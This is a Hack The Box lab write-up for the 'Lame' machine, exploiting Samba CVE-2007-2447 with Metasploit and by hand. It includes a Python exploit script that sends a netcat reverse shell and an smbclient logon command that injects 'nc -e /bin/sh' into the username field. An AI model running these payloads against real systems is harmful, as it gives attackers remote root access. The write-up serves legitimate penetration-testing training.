---
date: 2022-12-08
title: Lame HTB Write-Up
machine_ip: 10.10.10.3
os: Linux
difficulty: Easy
my_rating: 4
tags:
  - RCE
references: "[[📚CTF Box Writeups]]"
---
## Enumeration

Used to gather usernames, group names, hostnames, network shares and services, IP tables and routing tables, etc.

### Nmap

Used to gather usernames, group names, hostnames, network shares and services, IP tables and routing tables, etc. Nmap Provides features like port scanning, network scanning, vulnerability scanning, OS detection, service version detection, system bios scanning, etc.

Use the nmap command with flags: -sVC shows the port's version and in default script. -A enables OS detection, version detection, script scanning, and traceroute. -T4 sets the timing template (0-5), higher is faster.

{% code lineNumbers="true" %}
```
└─# nmap -sVC -A -T4 10.10.10.3
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-08 20:39 UTC
Nmap scan report for 10.10.10.3
Host is up (0.085s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Arris TG862G/CT cable modem (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-12-08T15:39:41-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h30m07s, deviation: 3h32m11s, median: 4s

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   88.24 ms 10.10.14.1
2   88.29 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.77 seconds

                                                                
```
{% endcode %}

We see that the target box has open FTP port, ssh and Samba SMB (21,22,139,445). and the version is vsftpd 2.3.4. It allows anonymous FTP login.

Google search shows the Samba 3.0.20 has a 'Username' map script' command execution exploit.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-08 144525.png" alt=""><figcaption></figcaption></figure>

## Exploitation

Take action on the identified vulnerabilities during the enumeration and exploit.

### msfconsole (with Metasploit Framework)

Metasploit Framework is a tool that identifies systematic vulnerabilities on servers and networks. Works with different operating systems and is open-source.

### msf>search & run

The search command in the msfconsole searches the Metasploit framework for exploits to the specified vulnerability.

Search command for vsftpd to find its exploits.

<pre data-line-numbers><code><strong>└─# msfconsole
</strong>                                                  
     ,           ,
    /             \                                                                                 
   ((__---,,,---__))                                                                                
      (_) O O (_)_________                                                                          
         \ _ /            |\                                                                        
          o_o \   M S F   | \                                                                       
               \   _____  |  *                                                                      
                |||   WW|||                                                                         
                |||     |||                                                                         
                                                                                                    

       =[ metasploit v6.1.27-dev                          ]
+ -- --=[ 2196 exploits - 1162 auxiliary - 400 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: You can use help to view all 
available commands

msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
<strong>   -  ----                                  ---------------  ----       -----  -----------
</strong>   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor                                                                                          


</code></pre>

Identified the exploit 'exploit/unix/ftp/vsftpd\_234\_backdoor to use. Run the use command for the exploit and set the rhost to 10.10.10.3 and lhost to 10.10.14.6. Check options.

{% code lineNumbers="true" %}
```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit
                                      -framework/wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 10.10.10.3
rhost => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set lhost 10.10.14.6
lhost => 10.10.14.6

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.10.3       yes       The target host(s), see https://github.com/rapid7/metasploit
                                      -framework/wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.

```
{% endcode %}

A walkthrough was used to determine that vsftpd was not exploitable in this machine. Appears that vsftpd is NOT exploitable without the password.

TRY ANOTER ATTACK VECTOR - Check the Samba connection for exploits. Search command for usermap\_script to find its exploits.

{% code lineNumbers="true" %}
```
msf6 > search usermap_script

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script                                                                                            


```
{% endcode %}

Use the exploit in msfconsole and set rhost and lhost accordingly. Run the exploit. Check whoami to determine what account I am logged into.

{% code lineNumbers="true" %}
```
msf6 exploit(multi/samba/usermap_script) > set rhost 10.10.10.3
rhost => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.14.6
lhost => 10.10.14.6
msf6 exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.10.3       yes       The target host(s), see https://github.com/rapid7/metasploit
                                      -framework/wiki/Using-Metasploit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.6       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Command shell session 1 opened (10.10.14.6:4444 -> 10.10.10.3:41991 ) at 2022-12-08 22:48:53 +0000

pwd
/
whoami
root

```
{% endcode %}

Navigate to user and root flags.

{% code lineNumbers="true" %}
```
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old

cd root

ls
Desktop
reset_logs.sh
root.txt
vnc.log

cat root.txt
5de9fb9b3e0bda0d438c07a35c44140b
```
{% endcode %}

Flag for Root identified. Now find the User flag.

{% code lineNumbers="true" %}
```
cd ..

ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old

cd home

ls
ftp
makis
service
user

cd makis

ls
user.txt

cat user.txt
eca68dfd21c736c1561b9315ab82ce81
```
{% endcode %}

Flag for User identified.

### Searchsploit (without Metasploit Framework)

Tool used to search for exploits and related data in the exploit database (Exploit-DB). Using shell script to parse through data from the CSV files from the repository.

Search for exploits for samba 3.0.20 to identify a known exploit.

<pre data-line-numbers><code><strong>└─# searchsploit samba 3.0.20  
</strong>------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
Samba 3.0.10 &#x3C; 3.3.5 - Format String / Security Bypass            | multiple/remote/10095.txt
Samba 3.0.20 &#x3C; 3.0.25rc3 - 'Username' map script' Command Executi | unix/remote/16320.rb
Samba &#x3C; 3.0.20 - Remote Heap Overflow                             | linux/remote/7701.txt
Samba &#x3C; 3.0.20 - Remote Heap Overflow                             | linux/remote/7701.txt
Samba &#x3C; 3.6.2 (x86) - Denial of Service (PoC)                     | linux_x86/dos/36741.py
------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

└─# searchsploit -m exploits/unix/remote/16320.rb           

  Exploit: Samba 3.0.20 &#x3C; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/16320
     Path: /usr/share/exploitdb/exploits/unix/remote/16320.rb
File Type: Ruby script, ASCII text

Copied to: /home/kali/CVE-2007-2447/16320.rb

</code></pre>

Multiple walkthroughs were used at this point to exploit Samba without Metasploit.

### Anonymous Login to FTP

Identified the anonymous login and password for remote login 230 from nmap scan. Successful login but stuck here. Exit.

{% code lineNumbers="true" %}
```
└─# ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||29001|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||35585|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> 

```
{% endcode %}

### Python script from GitHub

When searching the CVE-2007-2447 for Samba 3.0.20 exploit on Google, I come to the GitHub of a python script payload used for the exploit.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-08 151524.png" alt=""><figcaption></figcaption></figure>

Make a git clone of the python script exploit. Install pysmb per the README on GitHub.

{% code lineNumbers="true" %}
```
└─# git clone https://github.com/amriunix/CVE-2007-2447.git
Cloning into 'CVE-2007-2447'...
remote: Enumerating objects: 11, done.
remote: Total 11 (delta 0), reused 0 (delta 0), pack-reused 11
Receiving objects: 100% (11/11), done.
Resolving deltas: 100% (3/3), done.
                                                                                                    
┌──(root㉿kali)-[/home/kali]
└─# ls
4478.c    CVE-2007-2447  Documents  Music     Public     Videos
49757.py  Desktop        Downloads  Pictures  Templates
                                                                                                    
┌──(root㉿kali)-[/home/kali]
└─# cd CVE-2007-2447 
                                                                                                    
┌──(root㉿kali)-[/home/kali/CVE-2007-2447]
└─# ls
README.md  usermap_script.py

└─# pip install pysmb                                      
Collecting pysmb
  Downloading pysmb-1.2.8.zip (1.3 MB)
     |████████████████████████████████| 1.3 MB 6.0 MB/s            
  Preparing metadata (setup.py) ... done
Requirement already satisfied: pyasn1 in /usr/lib/python3/dist-packages (from pysmb) (0.4.8)
Building wheels for collected packages: pysmb
  Building wheel for pysmb (setup.py) ... done
  Created wheel for pysmb: filename=pysmb-1.2.8-py3-none-any.whl size=84114 sha256=79ab1a9709ab6818e2948c1bf1f9046440e8217111477d30c6541cf6776de09f
  Stored in directory: /root/.cache/pip/wheels/bd/87/29/92f27d90591eb2c17d5713e72977a1e066ea6a303c705c4ffc
Successfully built pysmb
Installing collected packages: pysmb
Successfully installed pysmb-1.2.8
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv                                                                               
                                                
```
{% endcode %}

Python script from GitHub is as follows. The 'nohup' command triggers the exploit.

{% code lineNumbers="true" %}
```python
import sys
from smb.SMBConnection import SMBConnection

def exploit(rhost, rport, lhost, lport):
        payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
        username = "/=`nohup " + payload + "`"
        conn = SMBConnection(username, "", "", "")
        try:
            conn.connect(rhost, int(rport), timeout=1)
        except:
            print("[+] Payload was sent - check netcat !")

if __name__ == '__main__':
    print("[*] CVE-2007-2447 - Samba usermap script")
    if len(sys.argv) != 5:
        print("[-] usage: python " + sys.argv[0] + " <RHOST> <RPORT> <LHOST> <LPORT>")
    else:
        print("[+] Connecting !")
        rhost = sys.argv[1]
        rport = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]
        exploit(rhost, rport, lhost, lport)y
```
{% endcode %}

{% code lineNumbers="true" %}
```
└─# python usermap_script.py 10.10.10.3 139 10.10.14.6 4444
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !

```
{% endcode %}

This script did not work. Reaserch led me to another python script to try.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-08 155612.png" alt=""><figcaption></figcaption></figure>

This python script did not work for me either. After further research, I found a video explaining how to use smbclient and logon commands to gain access to 10.10.10.3.

### Smbclient command

This tool is part of the Samba suite. Offers an interface similar to that of the ftp program allowing communication to an SMB/CIFS server.

Locate the .conf file for smbclient and add following lines to the global section.

{% code lineNumbers="true" %}
```
└─# smbclient                                                               
Usage: smbclient [-?EgqBVNkPeC] [-?|--help] [--usage] [-R|--name-resolve=NAME-RESOLVE-ORDER]
        [-M|--message=HOST] [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST]
        [-m|--max-protocol=LEVEL] [-T|--tar=<c|x>IXFvgbNan] [-D|--directory=DIR]
        [-c|--command=STRING] [-b|--send-buffer=BYTES] [-t|--timeout=SECONDS] [-p|--port=PORT]
        [-g|--grepable] [-q|--quiet] [-B|--browse] [-d|--debuglevel=DEBUGLEVEL]
        [-s|--configfile=CONFIGFILE] [-l|--log-basename=LOGFILEBASE] [-V|--version]
        [--option=name=value] [-O|--socket-options=SOCKETOPTIONS] [-n|--netbiosname=NETBIOSNAME]
        [-W|--workgroup=WORKGROUP] [-i|--scope=SCOPE] [-U|--user=USERNAME] [-N|--no-pass]
        [-k|--kerberos] [-A|--authentication-file=FILE] [-S|--signing=on|off|required]
        [-P|--machine-pass] [-e|--encrypt] [-C|--use-ccache] [--pw-nt-hash] service <password>
                                                                                                    
┌──(root㉿kali)-[/home/kali/CVE-2007-2447]
└─# locate smb.conf                                 
/etc/samba/smb.conf
/usr/share/doc/samba-common/examples/smb.conf.default
/usr/share/man/man5/smb.conf.5.gz
/usr/share/samba/smb.conf
/usr/share/samba/smb.conf.original
/var/lib/ucf/cache/:etc:samba:smb.conf
                                                                                                    
┌──(root㉿kali)-[/home/kali/CVE-2007-2447]
└─# nano /etc/samba/smb.conf

```
{% endcode %}

{% code lineNumbers="true" %}
```
[global]

client min protocol = NT1
client max protocol = SMB3
```
{% endcode %}

We already copied over the exploit from searchsploit results using the following command.

{% code lineNumbers="true" %}
```
└─# searchsploit -m exploits/unix/remote/16320.rb
```
{% endcode %}

Use the smbclient option -L to list the services available on a server. In our case we are interested in the 'oh noes' /tmp directory. When logging in, try entering the password with nothing entered.

{% code lineNumbers="true" %}
```
└─# smbclient -L 10.10.10.3   
Enter WORKGROUP\root's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
                                                                                                    
```
{% endcode %}

### Netcat (nc)

Reads and writes data across network connections, using TCP and UDP protocols. It can also function as a server, by listening for inbound connections on arbitrary ports and then doing the same reading and writing.

Start the netcat listening command for our specified port. Once we get SMB access the shell will show up here. -nvlp options are used to be numeric only, set listen mode for inbound connects, verbose, and local port number.

```
└─# nc -nvlp 4444
listening on [any] 4444 ...
```

We can then move over the the /tmp directory and again enter nothing as the password.

The logon command is accessible from the SMB and we can use the nohup command from the 16320.rb copied over from the CVE.

{% code lineNumbers="true" %}
```
└─# smbclient //10.10.10.3/tmp
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "/=`nohup nc -e /bin/sh 10.10.14.6 4444`"
Password: 
```
{% endcode %}

Now check netcat listening port for SMB access. We have root access. Navigate to Root and User flags.

{% code lineNumbers="true" %}
```
└─# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.3] 51242

whoami
root

ls

bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old

cd root

ls

Desktop
reset_logs.sh
root.txt
vnc.log

cat root.txt
5de9fb9b3e0bda0d438c07a35c44140b

cd ..

ls

bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old

cd home 

ls

ftp
makis
service
user

cd makis

ls
user.txt

cat user.txt
eca68dfd21c736c1561b9315ab82ce81
```
{% endcode %}

The Root and User Flags have been discovered.
